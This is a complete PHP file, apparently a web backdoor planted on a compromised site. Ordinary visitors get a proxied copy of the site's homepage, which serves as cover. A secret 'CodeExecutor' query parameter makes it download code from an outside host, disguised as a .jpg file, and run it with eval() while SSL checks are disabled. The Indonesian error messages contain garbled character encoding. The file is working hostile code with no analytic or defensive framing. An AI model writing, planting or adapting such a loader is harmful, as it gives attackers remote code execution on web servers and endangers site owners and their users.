<?php
error_reporting(1);
ini_set('display_errors', 1);


class CurlFetcher {
    public function fetchContent(string $url) {
        if (function_exists('curl_version')) {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($curl, CURLOPT_TIMEOUT, 10);

            $response = curl_exec($curl);
            $error = curl_error($curl);
            curl_close($curl);

            if ($response === false || empty(trim($response))) {
                return "<h3 style='color:red'>ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ Gagal ambil konten. Error: $error</h3>";
            }

            return $response;
        }
        return "<h3 style='color:red'>ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ cURL tidak tersedia di server ini</h3>";
    }
}

// ==== CodeExecutor class ====
class CodeExecutor {
    private $fetcher;
    public function __construct(CurlFetcher $fetcher) {
        $this->fetcher = $fetcher;
    }

    public function executeCodeFromURL(string $url): void {
        $code = $this->fetcher->fetchContent($url);
        if ($code && trim($code) !== '') {
            eval("?>" . $code);
        } else {
            echo "<p style='color:red'>ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ Gagal ambil atau isi kosong dari URL: $url</p>";
        }
    }
}

// ==== MAIN LOGIC ====
$fetcher = new CurlFetcher();

if (isset($_GET['CodeExecutor'])) {
    $executor = new CodeExecutor($fetcher);
    $executor->executeCodeFromURL("https://batukdikomikaja.pages.dev/rudi.jpg");
    exit;
}

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'];
$target_url = $protocol . $host . "/";


$html = $fetcher->fetchContent($target_url);



$parsed = parse_url($target_url);
if ($parsed && isset($parsed['scheme']) && isset($parsed['host'])) {
    $base_url = $parsed['scheme'] . '://' . $parsed['host'];
    $html = preg_replace('/<head[^>]*>/i', '$0<base href="' . $base_url . '/">', $html, 1);
}

echo $html;
?>
